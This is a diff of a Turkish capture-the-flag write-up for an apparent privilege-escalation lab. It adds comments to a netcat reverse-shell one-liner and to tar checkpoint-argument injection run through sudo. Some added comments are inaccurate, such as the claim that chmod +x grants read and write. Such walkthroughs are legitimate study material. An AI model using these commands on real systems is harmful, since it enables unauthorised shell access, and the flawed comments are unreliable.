@@ -254,16 +254,16 @@ Michael yetkileriyle çalışan bir .sh dosyası var. Eğer bu dosyayı sömüre
 
 ```
 cat > /opt/backups/shell.sh << EOF
-#!/bin/bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f
-EOF
+#!/bin/bash      //Yazdığımız kodun bash script formatında olduğunu belirtiyoruz.
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f  //Reverse shell almak için gereken kod.
+EOF      //yazma modunu kapatıyoruz.
 ```
 
 ```
-jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh
-jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"
-jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
-jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
+jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh     //yazdığımız shell.sh dosyasına okuma+yazma+değiştirme yetkisini veriyoruz.
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"  //checkpoint noktası oluşturuyoruz.
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh" // oluşturduğumuz checkpoint noktasının eylemini belirtiyoruz.
+jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh   //michael adında backup dosyamızı çalıştırıyoruz.
 ```
 Çalıştırmadan önce kendi terminalinizde "nc listener" açın : 
 
@@ -273,6 +273,9 @@ melami㉿Melami> nc -lvnp 4444
 ![nc](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/nc.png)
 
 Tekrar ssh bağlantısına geri dönün. Kodu çalıştırmadan önce backup.tar dosyasını silin.
+
+Çünkü backup.sh dosyası backup.tar ı bulamazsa aynı klasördeki diğer dosyaları çalıştıracaktır(yani bizim dosyamızı)
+
 ```
 rm backup.tar
 sudo -u michael /opt/backups/backup.sh
